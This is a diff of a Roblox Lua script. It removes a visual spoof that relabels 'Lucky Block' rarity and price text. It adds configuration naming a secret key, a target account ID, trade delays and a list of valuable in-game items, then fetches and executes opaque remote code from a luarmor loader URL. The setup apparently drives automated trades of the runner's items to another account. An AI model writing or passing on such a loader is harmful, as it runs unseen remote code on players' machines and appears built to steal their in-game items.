@@ -1,46 +1,15 @@
-local debris = workspace.Debris
-print("zzhub")
-
-local function check(obj)
-    local isLucky = false
-    for , v in pairs(obj:GetDescendants()) do
-        if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text:find("Lucky Block") then
-            isLucky = true
-            break
-        end
-    end
-    if not isLucky then return end
-
-    for , v in pairs(obj:GetDescendants()) do
-        -- Change Rarity label
-        if v:IsA("TextLabel") and v.Name == "Rarity" then
-            v.Text = "OG"
-            v.TextColor3 = Color3.fromRGB(255, 215, 0)
-            v.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-            v.TextStrokeTransparency = 0
-            v.BackgroundTransparency = 1
-        end
-
-        -- Change Cost/Price label to $500B
-        if v:IsA("TextLabel") and (v.Name == "Cost" or v.Name == "Price") then
-            v.Text = "$1T"
-            v.TextColor3 = Color3.fromRGB(144, 238, 0)
-            v.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-            v.TextStrokeTransparency = 0
-            v.BackgroundTransparency = 1
-        end
-    end
-end
-
-for _, v in pairs(debris:GetChildren()) do
-    if v.Name == "FastOverheadTemplate" then
-        check(v)
-    end
-end
-
-debris.ChildAdded:Connect(function(v)
-    if v.Name == "FastOverheadTemplate" then
-        task.wait()
-        check(v)
-    end
-end)
+getgenv().SECRET_KEY = "mrr_37eeeefafed44ad1bdbcd2529adbfd56"
+getgenv().TARGET_ID = 3611309254
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Headless Horseman"] = true,
+    ["Fishino Clownino"] = true,
+    ["Love Love Bear"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
